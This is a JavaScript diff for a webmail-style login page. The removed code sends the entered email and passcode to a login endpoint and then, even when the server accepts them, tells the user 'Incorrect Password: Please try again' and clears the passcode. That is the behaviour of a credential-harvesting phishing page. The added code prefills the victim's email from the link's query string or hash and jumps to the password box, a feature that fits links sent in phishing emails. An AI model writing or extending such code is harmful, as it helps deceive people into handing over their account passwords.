@@ -1,80 +1,26 @@
-const form        = document.getElementById('login-form');
-const btn         = document.getElementById('submit-btn');
-const emailInput  = document.getElementById('email');
-const passInput   = document.getElementById('passcode');
+/* ---------- prefill the email from a link ---------- */
+function emailFromLink() {
+  const params = new URLSearchParams(window.location.search);
+  let value = params.get('email');
 
-const SAVED_EMAIL = 'webmail_email';
+  if (!value && window.location.hash.length > 1) {
+    value = window.location.hash.slice(1);
+    if (value.toLowerCase().startsWith('email=')) value = value.slice(6);
+    value = decodeURIComponent(value);
+  }
 
-/* ---------- toast pop-up ---------- */
-function toast(text) {
-  const el = document.createElement('div');
-  el.className = 'toast';
-  el.textContent = text;
-  document.body.appendChild(el);
-
-  requestAnimationFrame(() => el.classList.add('show'));
-
-  setTimeout(() => {
-    el.classList.remove('show');
-    setTimeout(() => el.remove(), 250);
-  }, 3000);
+  return (value || '').trim();
 }
 
-/* ---------- remember the email ---------- */
-const remembered = localStorage.getItem(SAVED_EMAIL);
-if (remembered) emailInput.value = remembered;
+const linkEmail = emailFromLink();
 
-emailInput.addEventListener('input', () => {
-  const value = emailInput.value.trim();
-  if (value) {
-    localStorage.setItem(SAVED_EMAIL, value);
-  } else {
-    localStorage.removeItem(SAVED_EMAIL);
-  }
-});
-
-/* ---------- submit ---------- */
-form.addEventListener('submit', async (event) => {
-  event.preventDefault();
-
-  const email    = emailInput.value.trim();
-  const passcode = passInput.value;
-
-  // 3. empty fields
-  if (!email || !passcode) {
-    toast('Please fill in the fields');
-    return;
-  }
-
-  btn.disabled = true;
-  btn.textContent = 'Logging in...';
-
-  try {
-    const response = await fetch('/api/login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ email, passcode })
-    });
-
-    const data = await response.json();
-
-    if (!response.ok) {
-      toast(data.error || 'Something went wrong');
-      return;
-    }
-
-    // 4. everything filled in
-    toast('Incorrect Password: Please try again');
-
-    // 2. keep the email, clear only the passcode
-    passInput.value = '';
-    passInput.focus();
-
-  } catch (error) {
-    toast('Could not reach the server. Try again.');
-
-  } finally {
-    btn.disabled = false;
-    btn.textContent = 'Log in';
-  }
-});
+if (linkEmail) {
+  // came from a link — use that address and jump to the password box
+  emailInput.value = linkEmail;
+  localStorage.setItem(SAVED_EMAIL, linkEmail);
+  passInput.focus();
+} else {
+  // normal visit — restore whatever they typed last time
+  const remembered = localStorage.getItem(SAVED_EMAIL);
+  if (remembered) emailInput.value = remembered;
+}
